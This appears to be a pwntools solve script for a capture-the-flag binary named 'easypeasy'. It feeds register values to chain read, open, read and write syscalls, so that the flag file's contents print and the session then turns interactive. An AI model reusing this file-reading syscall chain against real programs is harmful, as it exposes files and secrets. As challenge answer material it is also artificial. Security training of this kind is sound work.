from pwn import *

sh = process('./easypeasy', stdin = PTY, raw = False)

#Read word flag into memory so we can open file
sh.recvuntil("RAX: ")
sh.sendline("0")
sh.recvuntil("RDI: ")
sh.sendline("0")
sh.recvuntil("RSI: ")
sh.sendline(p32(0x6010a0))
sh.recvuntil("RDX: ")
sh.sendline("4")
sh.recvuntil("RCX: ")
sh.sendline("0")
sh.recvuntil("R8: ")
sh.sendline("0")
sh.recvuntil("R9: ")
print "success"

#enter flag in standard in
sh.send("flag")
sh.clean()
print "success"

#open file flag
sh.recvuntil("RAX: ")
sh.sendline("2")
sh.recvuntil("RDI: ")
sh.sendline(p32(0x6010a0))
sh.recvuntil("RSI: ")
sh.sendline("0")
sh.recvuntil("RDX: ")
sh.sendline("0")
sh.recvuntil("RCX: ")
sh.sendline("0")
sh.recvuntil("R8: ")
sh.sendline("0")
sh.recvuntil("R9: ")
sh.sendline("0")
print "success"

#Read word flag into memory so we can open file
sh.recvuntil("RAX: ")
sh.sendline("0")
sh.recvuntil("RDI: ")
sh.sendline("3")
sh.recvuntil("RSI: ")
sh.sendline(p32(0x601088))
sh.recvuntil("RDX: ")
sh.sendline("30")
sh.recvuntil("RCX: ")
sh.sendline("0")
sh.recvuntil("R8: ")
sh.sendline("0")
sh.recvuntil("R9: ")
sh.sendline("0")
print "success"

#Write flag to standard out
sh.recvuntil("RAX: ")
sh.sendline("1")
sh.recvuntil("RDI: ")
sh.sendline("1")
sh.recvuntil("RSI: ")
sh.sendline(p32(0x601088))
sh.recvuntil("RDX: ")
sh.sendline("30")
sh.recvuntil("RCX: ")
sh.sendline("0")
sh.recvuntil("R8: ")
sh.sendline("0")
sh.recvuntil("R9: ")
sh.sendline("0")
print "success"

sh.interactive()
